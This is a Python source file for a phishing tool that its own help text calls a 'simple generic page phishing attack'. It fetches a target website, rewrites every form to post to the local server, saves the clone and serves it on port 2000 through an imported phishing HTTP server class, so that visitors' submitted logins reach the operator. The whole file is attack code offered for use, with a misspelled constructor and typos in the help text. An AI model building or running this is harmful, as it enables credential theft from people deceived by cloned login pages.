#http://www.stealmylogin.com/demo.html

from urllib.request import urlopen
from bs4 import BeautifulSoup
from servers.server import HTTPServerPhishing
import argparse
import signal, sys



class Phishing(object):
    def _init__(self):
        self.__url = None
        self.__ip = None

    def setUrl(self, url):
        if not url.startswith('http://'):
            url = 'http://' + url
        self.__url = url

    def setIP(self, ip):
        self.__ip = ip

    def getIP(self):
        return self.__ip    

    def getUrl(self):
        return self.__url

    def checkStatusUrl(self):
        result = urlopen(self.getUrl())
        if (result.getcode() == 200):
            return True
        return False

    def saveHtmlSite(self, html):
        with open("web/index.html" , "w") as f:
            f.write(str(html))
            f.close()

    def runCloneSite(self):
        if (not self.getUrl()): return 
        if (not self.checkStatusUrl()): return

        html = urlopen(self.getUrl()).read()
        content_inter = BeautifulSoup(html, "lxml")
        if (content_inter.find_all('form')):
            for tag in content_inter.find_all('form'):
                tag['method'], tag['action'] = 'post', ''

        self.saveHtmlSite(content_inter)

        http = HTTPServerPhishing(self.getIP(), 2000, self.getUrl(), "web/")
        http.run()


def signal_handler( sginal, frame):
    sys.exit(0)

version = "v1.0"

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="pshing - craate simple generic page phishing attaack")
    parser.add_argument('-u','--url',  dest='url',help='set the url to clone website', required=True)
    parser.add_argument('-i','--ip',  dest='localip',help='set the ipaddress of server',default='0.0.0.0')
    parser_load = parser.parse_args()

    obj_phishing = Phishing()
    obj_phishing.setUrl(parser_load.url)
    obj_phishing.setIP(parser_load.localip)
    signal.signal(signal.SIGINT, signal_handler)
    obj_phishing.runCloneSite()
    signal.pause()